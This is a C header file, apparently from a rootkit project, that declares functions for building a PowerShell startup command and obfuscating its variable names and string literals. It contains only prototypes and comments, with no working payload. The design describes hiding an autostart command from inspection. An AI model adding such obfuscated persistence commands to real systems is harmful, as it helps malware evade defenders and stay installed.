#define CUSTOM_ENTRY
#include "r77mindef.h"

/// <summary>
/// Creates the powershell startup command.
/// </summary>
/// <returns>
/// A newly allocated LPCSTR with the powershell command.
/// </returns>
LPWSTR GetPowershellCommand();
/// <summary>
/// Obfuscates all occurrences of a given variable name within a powershell command.
/// </summary>
/// <param name="command">The powershell command to obfuscate.</param>
/// <param name="variableName">A name that will be replaced with a new, randomized name.</param>
VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName);
/// <summary>
/// Obfuscates all string literals within a powershell command.
/// String literals must be typed like `thestring` instead of using single quotes.
/// </summary>
/// <param name="command">The powershell command to obfuscate.</param>
VOID ObfuscatePowershellStringLiterals(LPWSTR command);